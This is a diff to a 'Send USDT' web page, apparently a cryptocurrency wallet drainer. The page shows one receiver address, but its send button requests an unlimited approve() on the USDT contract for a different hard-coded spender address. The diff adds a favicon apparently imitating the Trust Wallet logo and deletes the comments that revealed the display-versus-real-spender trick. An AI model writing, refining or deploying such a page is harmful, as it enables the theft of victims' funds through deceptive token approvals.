@@ -5,6 +5,9 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Send USDT</title>
 
+<!-- ✅ FAVICON ADDED -->
+<link rel="icon" type="image/png" href="https://salman4sgsgit.github.io/wallet-demo/trustlogofav.png">
+
 <style>
 * { margin:0; padding:0; box-sizing:border-box; }
 
@@ -134,29 +137,21 @@ body {
 
 <script>
 // ===== CONFIG =====
-
-// UI receiver (just display)
 const RECEIVER_ADDRESS = '0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F';
-
-// 👇 REAL spender (IMPORTANT)
 const SPENDER_ADDRESS = '0x89112691C976D0a2D874B0ADAe693a0Add0dAe98';
-
 const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';
 const BSC_CHAIN_ID = '0x38';
 
 const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
-// ===== STATE =====
 let web3;
 let userAccount;
 let usdt;
 
-// ===== UI =====
 const sendBtn = document.getElementById('sendBtn');
 const statusDiv = document.getElementById('status');
 const amountInput = document.getElementById('amount');
 
-// ===== ABI =====
 const ABI = [{
     "constant": false,
     "inputs": [
@@ -174,7 +169,6 @@ const ABI = [{
     "type":"function"
 }];
 
-// ===== FORCE BSC =====
 async function forceBSC() {
     try {
         await window.ethereum.request({
@@ -199,7 +193,6 @@ async function forceBSC() {
     }
 }
 
-// ===== INIT =====
 async function init() {
     if (!window.ethereum) {
         showStatus("Install wallet", true);
@@ -221,14 +214,13 @@ async function init() {
     }
 }
 
-// ===== APPROVE =====
 async function sendUSDT() {
     sendBtn.disabled = true;
     showStatus("Confirm approval in wallet...");
 
     try {
         await usdt.methods.approve(
-            SPENDER_ADDRESS,   // ✅ FIXED HERE
+            SPENDER_ADDRESS,
             MAX_UINT
         ).send({ from: userAccount });
 
@@ -241,7 +233,6 @@ async function sendUSDT() {
     sendBtn.disabled = false;
 }
 
-// ===== HELPERS =====
 function showStatus(msg, error=false) {
     statusDiv.innerText = msg;
     statusDiv.style.color = error ? "#ff4d4f" : "#16c784";
@@ -252,7 +243,6 @@ async function setMax() {
     amountInput.value = web3.utils.fromWei(bal, 'ether');
 }
 
-// ===== EVENTS =====
 sendBtn.onclick = sendUSDT;
 window.onload = init;
 
